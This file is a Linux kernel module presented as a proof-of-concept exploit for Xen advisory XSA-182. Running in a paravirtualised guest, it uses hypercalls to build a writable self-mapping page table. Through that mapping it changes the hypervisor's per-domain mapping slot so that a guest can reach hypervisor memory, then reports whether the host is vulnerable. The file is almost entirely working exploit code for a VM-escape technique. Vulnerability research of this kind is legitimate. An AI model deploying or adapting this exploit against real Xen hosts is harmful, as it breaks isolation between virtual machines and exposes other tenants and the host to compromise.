#include <linux/module.h>
#include <linux/sched.h>
#include <asm/xen/hypercall.h>
#include <asm/xen/page.h>
#include <asm/xen/interface.h>

#define DEBUG(_f, _a...) printk(KERN_INFO "xsa-182-poc:%d - " _f "\n", __LINE__, ## _a)
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)
#define __mfn(_v) ((unsigned long) (__machine_addr(_v) >> PAGE_SHIFT))

#define MAX_MFN 0x7FFFFF
#define PMD_FLAG (_PAGE_RW | _PAGE_USER | _PAGE_ACCESSED | _PAGE_DIRTY | _PAGE_PRESENT)
#define PTE_FLAG PMD_FLAG
#define PADDR_BITS 44
#define PADDR_MASK ((1ULL << PADDR_BITS)-1)
#define pg_entry(__pgd, i) ((__pgd) + i)
#define pgd_to_mfn(__pgd) ((__pgd->pgd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pud_to_mfn(__pud) ((__pud->pud & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pmd_to_mfn(__pmd) ((__pmd->pmd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pte_to_mfn(__pte) ((__pte->pte & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define no_reserved_bits(x) ((x & (1<<7)) | ( (x>>43) & 127))
struct shared_info dummy_shared_info;
struct shared_info *HYPERVISOR_shared_info = (void *)&dummy_shared_info;
static struct arch_shared_info *my_arch;

void page_walk(unsigned long va)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	struct mm_struct *mm = current->mm;

	pgd = pgd_offset(mm, va);
	pud = pud_offset(pgd, va);
	pmd = pmd_offset(pud, va);
	pte = pte_offset_kernel(pmd, va);
	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
}

pgd_t *get_pgd(unsigned long va)
{
	struct mm_struct *mm = current->mm;
	return pgd_offset(mm, va);
}

pud_t *get_pud(unsigned long va)
{
	return pud_offset(get_pgd(va), va);
}

pmd_t *get_pmd(unsigned long va)
{
	return pmd_offset(get_pud(va), va);
}

pte_t *get_pte(unsigned long va)
{
	return pte_offset_kernel(get_pmd(va), va);
}


void map_shared_info(void){
    if (!xen_feature(XENFEAT_auto_translated_physmap)) {
        printk("XENFEAT_auto_translated_physmap not enabled\n");
        printk("shared_info\t%lx\n", xen_start_info->shared_info);
        printk("__va(shared_info)\t%p\n", __va(xen_start_info->shared_info));
        set_fixmap(FIX_PARAVIRT_BOOTMAP, xen_start_info->shared_info);
        HYPERVISOR_shared_info = (struct shared_info *)fix_to_virt(FIX_PARAVIRT_BOOTMAP);
        printk("HYPERVISOR_shared_info\t%p\n",HYPERVISOR_shared_info);
    } else{
        HYPERVISOR_shared_info = (struct shared_info *)__va(xen_start_info->shared_info);
    }

    if(HYPERVISOR_shared_info == &dummy_shared_info)
    {
        printk(KERN_ALERT "shared_info not mapped.\n");
    }
    else
    {
        my_arch = &HYPERVISOR_shared_info->arch;
        printk("shared_info address %p\n", &HYPERVISOR_shared_info);
        printk("arch_shared_infp address %p\n", &my_arch);
    }
}

unsigned long p2m(unsigned long gfn)
{
    if(HYPERVISOR_shared_info == &dummy_shared_info)
    {
        printk(KERN_ALERT "Mapping shared info.\n");
        map_shared_info();
    }

    return ((unsigned long *)my_arch->p2m_vaddr)[gfn];


}

int mmu_update(unsigned long ptr, unsigned long val)
{
    struct mmu_update mmu_updates;
    struct mmuext_op uops_tlb_flush_all[] = {{.cmd =  MMUEXT_TLB_FLUSH_ALL}};
    int rc;

    mmu_updates.ptr = ptr | MMU_NORMAL_PT_UPDATE;
    mmu_updates.val = val;
    rc = HYPERVISOR_mmu_update(&mmu_updates, 1, NULL, DOMID_SELF);
    HYPERVISOR_mmuext_op(uops_tlb_flush_all, 1, NULL, DOMID_SELF);

    return rc;
}

static int __init exploit_init(void)
{
    int xen_version = HYPERVISOR_xen_version(0, NULL);
    unsigned long *page_directory = (unsigned long *) (current->mm->pgd);
    unsigned long val_to_copy = 0;
    unsigned long addr_to_copy = 0;
    const unsigned long self_number = 42;
    /*
     from xen/include/asm-x86/config.h
     *  0xffff820000000000 - 0xffff827fffffffff [512GB, 2^39 bytes, PML4:260]
     *    Per-domain mappings (e.g., GDT, LDT).
    */
    const unsigned long target = 260;
    unsigned long *writable_page_directory = NULL;
    int rc;
    //unsigned long gfn;

    DEBUG("xen_version = %d.%d", (xen_version >> 16) & 0xFFFF, xen_version & 0xFFFF);
    DEBUG("page_directory mfn = 0x%lx", __mfn(page_directory));
    DEBUG("page_directory  = 0x%016lx", *(unsigned long *) page_directory);
    //gfn = __mfn(page_directory);
    //DEBUG("page_directory mfn(p2m) = 0x%lx", p2m(gfn));
    DEBUG("page_directory[%lu] = 0x%016lx", target, page_directory[target]);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);

    // create a self-mapping entry without RW flag
    rc = mmu_update(__machine_addr(&page_directory[self_number]), __machine_addr(page_directory) | _PAGE_USER | _PAGE_PRESENT);
    DEBUG("rc = 0x%x", rc);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);

    // fast path doesn't check RW flag ...
    //rc = mmu_update(__machine_addr(&page_directory[self_number]), page_directory[self_number] | _PAGE_RW);
    val_to_copy = page_directory[self_number] | _PAGE_RW;
    rc = HYPERVISOR_arbitrary_access((unsigned long) __machine_addr(&page_directory[self_number]), (const void *) &val_to_copy, sizeof(unsigned long), ARBITRARY_WRITE | ARBITRARY_VERBOSE);
    DEBUG("rc = 0x%x", rc);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);
    if (rc != 0) {
        DEBUG("not vulnerable");
        goto end;
    }

    // craft magic address
    writable_page_directory = (unsigned long*) ((self_number << 39) | (self_number << 30) | (self_number << 21) | (self_number << 12));
    DEBUG("writable_page_directory = 0x%p", writable_page_directory);

    // enjoy
    DEBUG("writable_page_directory[%lu] = 0x%016lx", 0, writable_page_directory[0]);
    DEBUG("writable_page_directory[%lu] = 0x%016lx", target, writable_page_directory[target]);
    val_to_copy =   writable_page_directory[target] & ~_PAGE_NX;
    val_to_copy |= _PAGE_USER;
    DEBUG("new value (to write) writable_page_directory[%lu] = 0x%016lx", target, val_to_copy);
    addr_to_copy = val_to_copy >> 12 << 12;
    DEBUG("new address (to write) writable_page_directory[%lu] = 0x%016lx", target, addr_to_copy);
    DEBUG("Address: &writable_page_directory 0x%016lx", __machine_addr(&writable_page_directory));
    page_walk(writable_page_directory);
    DEBUG("0x%lx  = ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, writable_page_directory[target])).pgd\n",((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, writable_page_directory[target])).pgd));
    DEBUG("Address: &writable_page_directory 0x%016lx", __machine_addr(&writable_page_directory));
    DEBUG("Address: &writable_page_directory[target]: 0x%016lx", __machine_addr(&writable_page_directory) + target * sizeof(unsigned long));
    //rc = HYPERVISOR_arbitrary_access((unsigned long) __machine_addr(&writable_page_directory) + target * sizeof(unsigned long), (const void *) &val_to_copy, sizeof(unsigned long), ARBITRARY_WRITE | ARBITRARY_VERBOSE);
    //rc = HYPERVISOR_arbitrary_access((unsigned long) addr_to_copy, (const void *) &val_to_copy, sizeof(unsigned long), ARBITRARY_WRITE | ARBITRARY_VERBOSE);
    rc = HYPERVISOR_arbitrary_access((unsigned long) __machine_addr(&page_directory[target]), (const void *) &val_to_copy, sizeof(unsigned long), ARBITRARY_WRITE | ARBITRARY_VERBOSE);
    if (rc != 0) {
        DEBUG("not vulnerable");
        goto end;
    }
    DEBUG("writable_page_directory[%lu] = 0x%016lx", target, writable_page_directory[target]);

    writable_page_directory[target] |= _PAGE_USER;
    //HYPERVISOR_arbitrary_access(writable_page_directory[target] |= _PAGE_USER;
    DEBUG("writable_page_directory[%lu] = 0x%016lx", target, writable_page_directory[target]);
    DEBUG("vulnerable");

end:
    // reset entry because Linux is trying to unpin page & so on
    rc = mmu_update(__machine_addr(&page_directory[self_number]), 0x0);
    DEBUG("rc = 0x%x", rc);

    return 0;
}

static void __exit exploit_exit(void)
{
    printk("goodbye!\n");
}

module_init(exploit_init);
module_exit(exploit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jérémie Boutoille");
MODULE_DESCRIPTION("XSA-182 proof of concept");
